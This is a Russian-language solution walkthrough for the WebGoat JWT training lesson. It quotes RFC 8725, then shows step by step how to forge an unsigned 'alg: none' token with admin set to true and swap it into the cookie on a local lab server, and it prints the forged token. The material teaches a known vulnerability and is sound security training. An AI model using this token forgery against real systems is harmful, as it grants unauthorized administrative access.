=== Решение

Идея этого назначения заключается в том, что вы можете манипулировать токеном, что может привести к тому, что сервер будет интерпретировать токен по-другому. В начале, когда появились библиотеки JWT, они реализовали спецификацию буквально, то есть библиотека брала алгоритм, указанный внутри заголовка, и пыталась с ним работать.

[Цитата, https://tools.ietf.org/html/rfc8725#section-2.1]
____
Подписанные JSON Web Tokens содержат явное указание на
алгоритм подписи в виде параметра заголовка «alg» для обеспечения
криптографической гибкости. Это, в сочетании с недостатками дизайна в
некоторых библиотеках и приложениях, привело к нескольким атакам:

* Алгоритм может быть изменен на «none» злоумышленником, и некоторые
библиотеки будут доверять этому значению и «проверять» JWT без
проверки какой-либо подписи.

* Значение параметра «RS256» (RSA, 2048 бит) может быть изменено на «HS256» (HMAC, SHA-256), и некоторые библиотеки будут пытаться проверить
подпись с помощью HMAC-SHA256 и открытого ключа RSA в качестве
общего секрета HMAC (см. [McLean] и [CVE-2015-9235]).

Для смягчения последствий см. Разделы 3.1 и 3.2.
____

По сути, библиотеки просто анализировали токен, который им дали, не проверяя, какая криптографическая операция использовалась при создании токена.

==== Решение

Во-первых, обратите внимание, что мы вошли в систему как `Гость`, поэтому сначала выберите другого пользователя, например: Tom.
Пользователю Тому разрешено голосовать, как вы видите, но он не может сбросить голоса. Если посмотреть на запрос, то в ответе будет возвращен `access_token`:

[source]
----
GET http://localhost:8080/WebGoat/JWT/votings/login?user=Tom HTTP/1.1

access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MDgxMjg1NjYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.rTSX6PSXqUoGUvQQDBiqX0re2BSt7s2-X6FPf34Qly9SMpqIUSP8jykedJbjOBNlM3_CTjgk1SvUv48Pz8zIzA
----

Расшифровка токена дает:

[source]
----
{
  "alg": "HS512"
}
{
  "iat": 1608128566,
  "admin": "false",
  "user": "Tom"
}
----

Мы можем изменить утверждение `admin` на `false`, но тогда подпись станет недействительной. Как мы можем получить действительную подпись?
Глядя на https://tools.ietf.org/html/rfc7519#section-6.1[Спецификация RFC] `alg: none` является допустимым выбором и дает незащищенный JWT.
Давайте изменим наш токен:

[source]
----
headers:

{
  "alg": "none"
}

claims:

{
  "iat": 1608128566,
  "admin": "true",
  "user": "Tom"
}
----

Если мы используем WebWolf для создания нашего токена, мы получим:

[source]
----
eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE2MDgxMjg1NjYsDQogICJ1c2VyIiA6ICJUb20iDQp9
----

Теперь мы можем заменить токен в cookie и выполнить сброс еще раз. Одна вещь, на которую следует обратить внимание, это добавление `.` в конце, иначе токен недействителен.

== Ссылки

Для получения дополнительной информации посмотрите следующее видео:

video::wt3UixCiPfo[youtube, height=480, width=100%]
